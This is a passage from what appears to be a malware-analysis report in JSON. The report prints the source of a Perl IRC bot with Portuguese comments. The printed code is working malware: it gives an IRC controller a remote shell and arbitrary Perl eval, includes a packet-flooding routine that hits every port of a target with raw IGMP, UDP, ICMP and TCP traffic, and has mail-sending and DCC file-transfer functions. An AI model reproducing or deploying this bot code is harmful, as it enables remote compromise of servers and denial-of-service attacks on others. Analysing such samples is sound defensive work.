            "           print SENDMAIL \"Subject: $subject\\n\";",
            "           print SENDMAIL \"From: $sender\\n\";",
            "           print SENDMAIL \"To: $recipient\\n\\n\";",
            "           print SENDMAIL \"@corpo\\n\\n\";",
            "           close (SENDMAIL);",
            "           sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "01email enviado para: $recipient\");",
            "           }",
            "           exit;",
            "    }",
            "sub ircase {",
            "  my ($kem, $printl, $case) = @_;",
            "   if ($case =~ /^join (.*)/) {",
            "     j(\"$1\");",
            "   }",
            "   elsif ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "   elsif ($case =~ /^rejoin\\s+(.*)/) {",
            "      my $chan = $1;",
            "      if ($chan =~ /^(\\d+) (.*)/) {",
            "        for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "          p(\"$2\");",
            "          j(\"$2\");",
            "        }",
            "      } else {",
            "          p(\"$chan\");",
            "          j(\"$chan\");",
            "      }",
            "   }",
            "   elsif ($case =~ /^op/) {",
            "      op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "      my $oarg = substr($case, 3);",
            "      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   elsif ($case =~ /^deop/) {",
            "      deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "      my $oarg = substr($case, 5);",
            "      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   elsif ($case =~ /^voice/) {",
            "      voice(\"$printl\", \"$kem\") if $case eq \"voice\";",
            "      $oarg = substr($case, 6);",
            "      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   elsif ($case =~ /^devoice/) {",
            "      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";",
            "      $oarg = substr($case, 8);",
            "      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   elsif ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "      msg(\"$1\", \"$2\");",
            "   }",
            "   elsif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        msg(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   elsif ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "        ctcp(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   elsif ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "      ctcp(\"$1\", \"$2\");",
            "   }",
            "   elsif ($case =~ /^invite\\s+(\\S+) (.*)/) {",
            "      invite(\"$1\", \"$2\");",
            "   }",
            "   elsif ($case =~ /^nick (.*)/) {",
            "      nick(\"$1\");",
            "   }",
            "   elsif ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {",
            "       conectar(\"$2\", \"$1\", 6667);",
            "   }",
            "   elsif ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {",
            "      DCC::SEND(\"$1\", \"$2\");",
            "   }",
            "   elsif ($case =~ /^raw (.*)/) {",
            "      sendraw(\"$1\");",
            "   }",
            "   elsif ($case =~ /^eval (.*)/) {",
            "      eval \"$1\";",
            "   }",
            "   elsif ($case =~ /^entra\\s+(\\S+)\\s+(\\d+)/) {",
            "    sleep int(rand($2));",
            "    j(\"$1\");",
            "   }",
            "   elsif ($case =~ /^sai\\s+(\\S+)\\s+(\\d+)/) {",
            "    sleep int(rand($2));",
            "    p(\"$1\");",
            "   }",
            "   elsif ($case =~ /^sair/) {",
            "     quit();",
            "   }",
            "   elsif ($case =~ /^novonick/) {",
            "    my $novonick = getnick();",
            "     nick(\"$novonick\");",
            "   }",
            "   elsif ($case =~ /^estatisticas (.*)/) {",
            "     if ($1 eq \"on\") {",
            "      $estatisticas = 1;",
            "      msg(\"$printl\", \"Estatsticas ativadas!\");",
            "     } elsif ($1 eq \"off\") {",
            "      $estatisticas = 0;",
            "      msg(\"$printl\", \"Estatsticas desativadas!\");",
            "     }",
            "   }",
            "   elsif ($case =~ /^pacotes (.*)/) {",
            "     if ($1 eq \"on\") {",
            "      $pacotes = 1;",
            "      msg(\"$printl\", \"Pacotes ativados!\") if ($estatisticas == \"1\");",
            "     } elsif ($1 eq \"off\") {",
            "      $pacotes = 0;",
            "      msg(\"$printl\", \"Pacotes desativados!\") if ($estatisticas == \"1\");",
            "     }",
            "   }",
            "sub shell {",
            "  return unless $acessoshell;",
            "  my $printl=$_[0];",
            "  my $comando=$_[1];",
            "  if ($comando =~ /cd (.*)/) {",
            "    chdir(\"$1\") || msg(\"$printl\", \"Diretrio inexistente!\");",
            "    return;",
            "  elsif ($pid = fork) {",
            "     waitpid($pid, 0);",
            "  } else {",
            "      if (fork) {",
            "         exit;",
            "       } else {",
            "           my @resp=`$comando 2>&1 3>&1`;",
            "           my $c=0;",
            "           foreach my $linha (@resp) {",
            "             $c++;",
            "             chop $linha;",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "             if ($c >= \"$linas_max\") {",
            "               $c=0;",
            "               sleep $sleep;",
            "             }",
            "           }",
            "           exit;",
            "       }",
            "#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki",
            "sub attacker {",
            "  my $iaddr = inet_aton($_[0]);",
            "  my $msg = 'B' x $_[1];",
            "  my $ftime = $_[2];",
            "  my $cp = 0;",
            "  my (%pacotes);",
            "  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "  return(undef) if $cp == 4;",
            "  my $itime = time;",
            "  my ($cur_time);",
            "  while ( 1 ) {",
            "     for (my $porta = 1; $porta <= 65535; $porta++) {",
            "       $cur_time = time - $itime;",
            "       last if $cur_time >= $ftime;",
            "       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);",
            "       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);",
            "       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);",
            "       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);",
            "       # DoS ?? :P",
            "       for (my $pc = 3; $pc <= 255;$pc++) {",
            "         next if $pc == 6;",
            "         $cur_time = time - $itime;",
            "         last if $cur_time >= $ftime;",
            "         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);",
            "       }",
            "     }",
            "     last if $cur_time >= $ftime;",
            "  return($cur_time, %pacotes);",
            "#############",
            "#  ALIASES  #",
            "#############",
            "sub action {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");",
            "sub ctcp {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub hop {",
            "    return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +h $_[1]\");",
            "sub dehop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +h $_[1]\");",
            "sub voice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +v $_[1]\");",
            "sub devoice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -v $_[1]\");",
            "sub ban {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +b $_[1]\");",
            "sub unban {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -b $_[1]\");",
            "sub kick {",
            "   return unless $#_ == 1;",
            "   sendraw(\"KICK $_[0] $_[1] :$_[2]\");",
            "sub modo {",
            "   return unless $#_ == 0;",
            "   sendraw(\"MODE $_[0] $_[1]\");",
            "sub mode { modo(@_); }",
            "sub j { &join(@_); }",
            "sub join {",
            "   return unless $#_ == 0;",
            "   sendraw(\"JOIN $_[0]\");",
            "sub p { part(@_); }",
            "sub part {sendraw(\"PART $_[0]\");}",
            "sub nick {",
            "  return unless $#_ == 0;",
            "  sendraw(\"NICK $_[0]\");",
            "sub invite {",
            "   return unless $#_ == 1;",
            "   sendraw(\"INVITE $_[1] $_[0]\");",
            "sub topico {",
            "   return unless $#_ == 1;",
            "   sendraw(\"TOPIC $_[0] $_[1]\");",
            "sub topic { topico(@_); }",
            "sub whois {",
            "  sendraw(\"WHOIS $_[0]\");",
            "sub who {",
            "  return unless $#_ == 0;",
            "  sendraw(\"WHO $_[0]\");",
            "sub names {",
            "  return unless $#_ == 0;",
            "  sendraw(\"NAMES $_[0]\");",
            "sub away {",
            "  sendraw(\"AWAY $_[0]\");",
            "sub back { away(); }",
            "sub quit {",
            "  sendraw(\"QUIT :$_[0]\");",
            "  exit;",
            "# DCC",
            "package DCC;",
            "sub connections {",
            "   my @ready = $dcc_sel->can_read(1);",
            "#   return unless (@ready);",
            "   foreach my $fh (@ready) {",
            "     my $dcctipo = $DCC{$fh}{tipo};",
            "     my $arquivo = $DCC{$fh}{arquivo};",
            "     my $bytes = $DCC{$fh}{bytes};",
            "     my $cur_byte = $DCC{$fh}{curbyte};",
            "     my $nick = $DCC{$fh}{nick};",
            "     my $msg;",
            "     my $nread = sysread($fh, $msg, 10240);",
            "     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {",
            "        $DCC{$fh}{status} = \"Cancelado\";",
            "        $DCC{$fh}{ftime} = time;",
            "        $dcc_sel->remove($fh);",
            "        $fh->close;",
            "        next;",
            "     }",
            "     if ($dcctipo eq \"get\") {",
            "        $DCC{$fh}{curbyte} += length($msg);",
            "        my $cur_byte = $DCC{$fh}{curbyte};",
            "        open(FILE, \">> $arquivo\");",
            "        print FILE \"$msg\" if ($cur_byte <= $bytes);",
            "        close(FILE);",
            "        my $packbyte = pack(\"N\", $cur_byte);",
            "        print $fh \"$packbyte\";",
            "        if ($bytes == $cur_byte) {",
            "           $dcc_sel->remove($fh);",
            "           $fh->close;",
            "           $DCC{$fh}{status} = \"Recebido\";",
            "           $DCC{$fh}{ftime} = time;",
            "           next;",
            "        }",
            "     } elsif ($dcctipo eq \"send\") {",
            "          my $send = $fh->accept;",
            "          $send->autoflush(1);",
            "          $dcc_sel->add($send);",
            "          $dcc_sel->remove($fh);",
            "          $DCC{$send}{tipo} = 'sendcon';",
            "          $DCC{$send}{itime} = time;",
            "          $DCC{$send}{nick} = $nick;",
            "          $DCC{$send}{bytes} = $bytes;",
            "          $DCC{$send}{curbyte} = 0;",
            "          $DCC{$send}{arquivo} = $arquivo;",
            "          $DCC{$send}{ip} = $send->peerhost;",
            "          $DCC{$send}{porta} = $send->peerport;",
            "          $DCC{$send}{status} = \"Enviando\";",
            "          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon",
            "          open(FILE, \"< $arquivo\");",
            "          my $fbytes;",
            "          read(FILE, $fbytes, 1024);",
            "          print $send \"$fbytes\";",
            "          close FILE;",
            "#          delete($DCC{$fh});",
            "     } elsif ($dcctipo eq 'sendcon') {",
            "          my $bytes_sended = unpack(\"N\", $msg);",
            "          $DCC{$fh}{curbyte} = $bytes_sended;",
            "          if ($bytes_sended == $bytes) {",
            "             $fh->close;",
            "             $dcc_sel->remove($fh);",
            "             $DCC{$fh}{status} = \"Enviado\";",
            "             $DCC{$fh}{ftime} = time;",
            "             next;",
            "          }",
            "          open(SENDFILE, \"< $arquivo\");",
            "          seek(SENDFILE, $bytes_sended, 0);",
            "          my $send_bytes;",
            "          read(SENDFILE, $send_bytes, 1024);",
            "          print $fh \"$send_bytes\";",
            "          close(SENDFILE);",
            "     }",
            "   }",
            "sub SEND {",
            "  my ($nick, $arquivo) = @_;",
            "  unless (-r \"$arquivo\") {",
            "    return(0);",
            "  my $dccark = $arquivo;",
            "  $dccark =~ s/[.*\\/](\\S+)/$1/;",
            "  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};",
            "  my $longip = unpack(\"N\",inet_aton($meuip));",
            "  my @filestat = stat($arquivo);",
            "  my $size_total=$filestat[7];",
            "  if ($size_total == 0) {",
            "     return(0);",
            "  my ($porta, $sendsock);",
            "  do {",
            "    $porta = int rand(64511);",
            "    $porta += 1024;",
            "    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);",
            "  } until $sendsock;",
            "  $DCC{$sendsock}{tipo} = 'send';",
            "  $DCC{$sendsock}{nick} = $nick;",
            "  $DCC{$sendsock}{bytes} = $size_total;",
            "  $DCC{$sendsock}{arquivo} = $arquivo;",
            "  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");",
            "sub GET {",
            "  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;",
            "  return(0) if (-e \"$arquivo\");",
            "  if (open(FILE, \"> $arquivo\")) {",
            "     close FILE;",
            "  } else {",
            "    return(0);",
            "  my $dccip=fixaddr($dcclongip);",
            "  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);",
            "  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);",
            "  $dccsock->autoflush(1);",
            "  $dcc_sel->add($dccsock);",
            "  $DCC{$dccsock}{tipo} = 'get';",
            "  $DCC{$dccsock}{itime} = time;",
            "  $DCC{$dccsock}{nick} = $nick;",
            "  $DCC{$dccsock}{bytes} = $bytes;",
            "  $DCC{$dccsock}{curbyte} = 0;",
            "  $DCC{$dccsock}{arquivo} = $arquivo;",
            "  $DCC{$dccsock}{ip} = $dccip;",
            "  $DCC{$dccsock}{porta} = $dccporta;",
            "  $DCC{$dccsock}{status} = \"Recebendo\";",
            "# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas",
            "sub Status {",
            "  my $socket = shift;",
            "  my $sock_tipo = $DCC{$socket}{tipo};",
            "  unless (lc($sock_tipo) eq \"chat\") {",
            "    my $nick = $DCC{$socket}{nick};",
            "    my $arquivo = $DCC{$socket}{arquivo};",
            "    my $itime = $DCC{$socket}{itime};",
            "    my $ftime = time;",
            "    my $status = $DCC{$socket}{status};",
            "    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});",
            "    my $d_time = $ftime-$itime;",
            "    my $cur_byte = $DCC{$socket}{curbyte};",
            "    my $bytes_total =  $DCC{$socket}{bytes};",
            "    my $rate = 0;",
            "    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;",
            "    my $porcen = ($cur_byte*100)/$bytes_total;",
            "    my ($r_duv, $p_duv);",
            "    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {",
            "       $r_duv = $3; $r_duv++ if $4 >= 5;",
            "       $rate = \"$1\\.$2\".\"$r_duv\";",
            "    }",
            "    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {",
            "       $p_duv = $3; $p_duv++ if $4 >= 5;",
            "       $porcen = \"$1\\.$2\".\"$p_duv\";",
            "    }",
            "    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");",
            "  return(0);",
            "# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)",
            "sub fixaddr {",
            "    my ($address) = @_;",
            "    chomp $address;     # just in case, sigh.",
            "    if ($address =~ /^\\d+$/) {",
            "        return inet_ntoa(pack \"N\", $address);",
            "    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {",
            "        return $address;",
            "    } elsif ($address =~ tr/a-zA-Z//) {                    # Whee! Obfuscation!",
            "        return inet_ntoa(((gethostbyname($address))[4])[0]);",
            "    } else {",
            "        return;",
            "    }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://orangutan.or.id/xpl/"
        ]
    },
    "time": "0:00:00.486857",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
